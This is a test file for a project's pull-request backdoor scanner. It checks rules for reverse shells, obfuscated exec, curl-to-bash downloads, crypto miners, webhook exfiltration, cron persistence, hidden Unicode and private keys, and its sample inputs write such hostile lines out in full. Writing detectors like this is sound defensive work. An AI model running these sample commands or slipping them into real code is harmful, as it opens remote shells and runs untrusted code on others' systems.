# SPDX-FileCopyrightText: Copyright the FleetPilot contributors
# SPDX-License-Identifier: GPL-3.0-or-later
"""Tests for scripts/pr_threat_scan.py, the backdoor check on pull requests."""
import importlib.util
import pathlib

_spec = importlib.util.spec_from_file_location(
    "pr_threat_scan", pathlib.Path(__file__).parent / "scripts" / "pr_threat_scan.py")
scan = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(scan)


def _rules(path, *lines):
    return {f[1] for f in scan.scan_lines((path, n, text) for n, text in enumerate(lines, 1)) if f[0] == "high"}


def test_added_lines_follow_the_hunks():
    diff = ("diff --git a/x.py b/x.py\n--- a/x.py\n+++ b/x.py\n@@ -3,0 +4,2 @@\n+one\n+two\n"
            "--- a/old.py\n+++ /dev/null\n@@ -1 +0,0 @@\n-gone\n")
    assert list(scan.added_lines(diff)) == [("x.py", 4, "one"), ("x.py", 5, "two")]


def test_backdoor_patterns_are_blocking():
    assert "reverse-shell" in _rules("tool.sh", "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1")
    assert "obfuscated-exec" in _rules("app.py", "exec(base64.b64decode(payload))")
    assert "download-and-run" in _rules("setup.sh", "curl -fsSL http://example.invalid/x | sudo bash")
    assert "crypto-miner" in _rules("notes.md", "./xmrig -o stratum+tcp://pool.example:3333")
    assert "exfiltration-host" in _rules("app.py", "requests.post('https://discord.com/api/webhooks/1/abc')")
    assert "ssh-key" in _rules("app.py", "KEY = 'ssh-ed25519 AAAA" + "C3NzaC1lZDI1NTE5" * 4 + "'")
    assert "persistence" in _rules("app.py", "open('/etc/cron.d/job', 'w').write(line)")
    assert "hidden-unicode" in _rules("app.py", "if user != 'admin‮':")


def test_authorized_keys_writes_need_review_not_block():
    found = scan.scan_lines([("app.py", 1, "open('/root/.ssh/authorized_keys', 'a').write(k)")])
    assert [(f[0], f[1]) for f in found] == [("review", "authorized-keys")]


def test_svg_with_script_is_blocking():
    assert "svg-script" in _rules("static/logo.svg", '<svg onload="alert(1)">')


def test_normal_code_is_not_flagged():
    assert not _rules("secret_box.py", "return base64.b64decode(value.encode(), validate=True).decode()")
    assert not _rules("README.md", "bash -c \"$(curl -fsSL https://example.invalid/install.sh)\"",
                      "curl -fsSL https://example.invalid/install.sh | bash")
    assert not _rules("app.py", "subprocess.run(['ssh', host], check=True)")


def test_the_scanner_does_not_flag_itself():
    assert not _rules("scripts/pr_threat_scan.py", "bash -i >& /dev/tcp/x/1")


def test_binaries_block_and_sensitive_paths_need_review():
    found = scan.scan_files("-\t-\ttools/helper.exe\n-\t-\tdocs/shot.png\n3\t1\tapp.py\n",
                            "A\ttools/helper.exe\nM\t.github/workflows/tests.yml\nM\tinstall.sh\nM\tapp.py\n")
    high = {(f[1], f[2]) for f in found if f[0] == "high"}
    review = {f[2] for f in found if f[0] == "review"}
    assert high == {("binary", "tools/helper.exe")}
    assert review == {".github/workflows/tests.yml", "install.sh"}


def test_report_fails_only_on_blocking_findings(capsys, monkeypatch):
    monkeypatch.delenv("GITHUB_STEP_SUMMARY", raising=False)
    assert scan.report([("review", "sensitive-path", "install.sh", 0, "changes installer")]) == 0
    assert scan.report([("high", "binary", "x.exe", 0, "binary")]) == 1
    assert "::error file=x.exe,title=binary::binary" in capsys.readouterr().out


def test_private_keys_but_not_placeholders():
    assert "private-key" in _rules("config.py", "KEY = '-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAA'")
    assert "private-key" in _rules("id_ed25519", "-----BEGIN OPENSSH PRIVATE KEY-----")
    assert not _rules("templates/add.html", 'placeholder="-----BEGIN RSA PRIVATE KEY-----&#10;..."')


def test_whole_repository_mode_finds_no_blocking_problem():
    lines, findings = scan.all_tracked_lines()
    assert not [f for f in scan.scan_lines(lines) + findings if f[0] == "high"]
